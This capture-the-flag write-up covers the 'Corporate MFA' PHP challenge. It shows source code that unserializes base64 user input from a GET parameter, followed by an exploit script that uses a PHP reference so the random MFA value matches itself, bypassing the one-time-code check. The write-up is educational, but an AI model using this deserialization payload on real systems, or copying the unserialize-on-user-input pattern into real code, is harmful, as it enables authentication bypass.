<hr />

<h2>description: PHP object injection (deserialization vulnerability)</h2>

<h1>Corporate MFA</h1>

<h2>Problem</h2>

<p>The source for this corporate zero-trust multi factor login portal has been leaked! Figure out how to defeat the super-secure one time code.</p>

<p>{% file src="../../.gitbook/assets/corpmfa.tar.gz" %}</p>

<h2>Source Code</h2>

<p><code>index.php</code>:</p>

<p>```php
<?php</p>

<p>include 'class/User.php';</p>

<p>if (!empty($<em>POST))
{
    // serialise POST data for easy logging
    $loginAttempt = serialize((object)$</em>POST);</p>

<pre><code>// log access
//Logger::log(Logger::SENSITIVE, 'Login attempt: ' . $loginAttempt);

// Hand over to federation login
// TODO currently just a mock up
// TODO encrypt information to avoid loos of confidentiality
header('Location: /?userdata=' . base64_encode($loginAttempt));
die();
</code></pre>

<p>}</p>

<p>if (!empty($<em>GET) &amp;&amp; isset($</em>GET['userdata']))
{
    // prepare notification data structure
    $notification = new stdClass();</p>

<pre><code>// check credentials &amp; MFA
try
{
    $user = new User(base64_decode($_GET['userdata']));
    if ($user-&gt;verify())
    {
        $notification-&gt;type = 'success';
        $notification-&gt;text = 'Congratulations, your flag is: ' . file_get_contents('/flag.txt');
    }
    else
    {
        throw new InvalidArgumentException('Invalid credentials or MFA token value');
    }
}
catch (Exception $e)
{
    $notification-&gt;type = 'danger';
    $notification-&gt;text = $e-&gt;getMessage();
}
</code></pre>

<p>}</p>

<p>include 'template/home.html';
```</p>

<p><code>User.php</code>:</p>

<p>```php
<?php</p>

<p>final class User
{
    private $userData;</p>

<pre><code>public function __construct($loginAttempt)
{
    $this-&gt;userData = unserialize($loginAttempt);
    if (!$this-&gt;userData)
        throw new InvalidArgumentException('Unable to reconstruct user data');
}

private function verifyUsername()
{
    return $this-&gt;userData-&gt;username === 'D0loresH4ze';
}

private function verifyPassword()
{
    return password_verify($this-&gt;userData-&gt;password, '$2y$07$BCryptRequires22Chrcte/VlQH0piJtjXl.0t1XkA8pw9dMXTpOq');
}

private function verifyMFA()
{
    $this-&gt;userData-&gt;_correctValue = random_int(1e10, 1e11 - 1);
    return (int)$this-&gt;userData-&gt;mfa === $this-&gt;userData-&gt;_correctValue;
}

public function verify()
{
    if (!$this-&gt;verifyUsername())
        throw new InvalidArgumentException('Invalid username');

    if (!$this-&gt;verifyPassword())
        throw new InvalidArgumentException('Invalid password');

    if (!$this-&gt;verifyMFA())
        throw new InvalidArgumentException('Invalid MFA token value');

    return true;
}
</code></pre>

<p>}
```</p>

<h2>Solution</h2>

<p>From analysing the source code, we can gather the following information:</p>

<ul>
<li>Username: Hardcoded</li>
<li>Password: From the first example here: <a href="https://www.php.net/manual/en/function.password-verify.php">https://www.php.net/manual/en/function.password-verify.php</a></li>
<li>MFA: Vulnerable to PHP object injection (<code>unserialize()</code> vulnerability)</li>
</ul>

<p>The trick here is to initialize the <code>mfa</code> attribute as a <strong>reference</strong> to the <code>_correctValue</code> attribute (using the ampersand operator &amp;). This will allow us to bypass the MFA check, which checks <code>mfa</code> against a randomly-generated <code>_correctValue</code>:</p>

<p><code>php
private function verifyMFA()
    {
        $this-&gt;userData-&gt;_correctValue = random_int(1e10, 1e11 - 1);
        return (int)$this-&gt;userData-&gt;mfa === $this-&gt;userData-&gt;_correctValue;
    }
</code></p>

<p>The exploit script:</p>

<p>```php
<?php
    include "class/User.php";</p>

<pre><code>$loginAttempt=new stdClass();
$loginAttempt-&gt;username = 'D0loresH4ze';
$loginAttempt-&gt;password = 'rasmuslerdorf';
$loginAttempt-&gt;_correctValue = NULL;
$loginAttempt-&gt;mfa = &amp;$loginAttempt-&gt;_correctValue;

$userData = serialize($loginAttempt);
$encoded = base64_encode($userData);
var_dump($encoded);

$user = new User(base64_decode($encoded));
var_dump($user);
$user-&gt;verify();
</code></pre>

<p>?>
```</p>
